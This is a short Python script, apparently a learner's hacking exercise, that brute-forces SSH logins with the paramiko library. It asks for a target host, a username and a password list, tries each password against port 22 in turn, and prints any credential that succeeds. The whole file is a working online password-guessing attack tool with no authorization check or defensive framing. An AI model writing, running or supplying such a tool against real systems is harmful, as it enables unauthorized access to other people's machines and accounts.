import paramiko, sys, os, socket, termcolor

# 3. Connects to machine via SSH
def ssh_connect(password, code=0):
    # Setup
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

# 1. Retrival of info
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

# 2. Checks if file path exists
if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

# 4. Tries each password on file
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()

        # Processing result of password
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[!!] Cant Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
